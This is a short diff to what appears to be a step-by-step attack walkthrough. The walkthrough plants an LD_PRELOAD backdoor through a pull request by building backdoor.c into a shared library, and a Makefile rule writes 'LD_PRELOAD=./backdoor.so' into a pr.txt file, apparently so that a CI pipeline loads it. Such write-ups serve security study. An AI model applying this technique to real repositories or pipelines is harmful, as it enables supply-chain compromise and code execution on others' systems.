@@ -52,7 +52,7 @@ int open(const char *pathname, int flags, ...) {
 }
 ```
 
-3. Create a new branch and modify the `Makefile`:
+3. Create a new branch and modify the `Makefile` (modify <PR_NUMBER> with the actual PR number):
 
 ```Makefile
 # Compiler and flags
@@ -80,7 +80,7 @@ $(SO_TARGET): backdoor.c | outputs
 # Rule to overwrite pr.txt with LD_PRELOAD env variable
 .PHONY: $(PR_FILE)
 $(PR_FILE): | outputs
-	echo -e "1\nLD_PRELOAD=./backdoor.so" > $@
+	printf "<PR_NUMBER>\nLD_PRELOAD=./backdoor.so" > $@
 
 # Clean everything
 clean:
